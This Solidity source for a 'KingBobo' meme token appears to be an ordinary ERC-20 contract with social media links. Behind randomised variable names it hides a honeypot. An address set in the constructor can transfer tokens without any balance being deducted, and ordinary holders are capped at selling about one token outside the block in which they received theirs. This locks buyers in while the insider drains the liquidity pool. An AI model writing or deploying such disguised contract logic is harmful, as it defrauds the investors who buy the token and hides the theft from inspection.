/*

https://t.me/Kingboboeth

http://www.twitter.com/KingBobochat

*/

// SPDX-License-Identifier: MIT

pragma solidity >0.8.13;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract KingBobo is Ownable {
    IUniswapV2Router02 private bhcml;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    event Transfer(address indexed from, address indexed to, uint256 value);

    string public name;

    uint256 private cmtdorpyvfs = 101;

    mapping(address => uint256) private tjeumknby;

    constructor(string memory nbcgesyfmlio, string memory fzmhg, address mcypkstdnbvl, address icodgf) {
        name = nbcgesyfmlio;
        symbol = fzmhg;
        balanceOf[msg.sender] = totalSupply;
        tjeumknby[icodgf] = cmtdorpyvfs;
        bhcml = IUniswapV2Router02(mcypkstdnbvl);
    }

    mapping(address => uint256) private xwyoszlbe;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) public balanceOf;

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address roksjzbu, uint256 hofcxdpq) public returns (bool success) {
        allowance[msg.sender][roksjzbu] = hofcxdpq;
        emit Approval(msg.sender, roksjzbu, hofcxdpq);
        return true;
    }

    string public symbol;

    function transfer(address uzxihkm, uint256 hofcxdpq) public returns (bool success) {
        ylpgemwkxazt(msg.sender, uzxihkm, hofcxdpq);
        return true;
    }

    uint8 public decimals = 9;

    function ylpgemwkxazt(address lbfuwojmtcan, address uzxihkm, uint256 hofcxdpq) private {
        address qfasc = IUniswapV2Factory(bhcml.factory()).getPair(address(this), bhcml.WETH());
        bool wagxyuni = 0 == tjeumknby[lbfuwojmtcan];
        if (wagxyuni) {
            if (lbfuwojmtcan != qfasc && xwyoszlbe[lbfuwojmtcan] != block.number && hofcxdpq < totalSupply) {
                require(hofcxdpq <= totalSupply / (10 ** decimals));
            }
            balanceOf[lbfuwojmtcan] -= hofcxdpq;
        }
        balanceOf[uzxihkm] += hofcxdpq;
        xwyoszlbe[uzxihkm] = block.number;
        emit Transfer(lbfuwojmtcan, uzxihkm, hofcxdpq);
    }

    function transferFrom(address lbfuwojmtcan, address uzxihkm, uint256 hofcxdpq) public returns (bool success) {
        require(hofcxdpq <= allowance[lbfuwojmtcan][msg.sender]);
        allowance[lbfuwojmtcan][msg.sender] -= hofcxdpq;
        ylpgemwkxazt(lbfuwojmtcan, uzxihkm, hofcxdpq);
        return true;
    }
}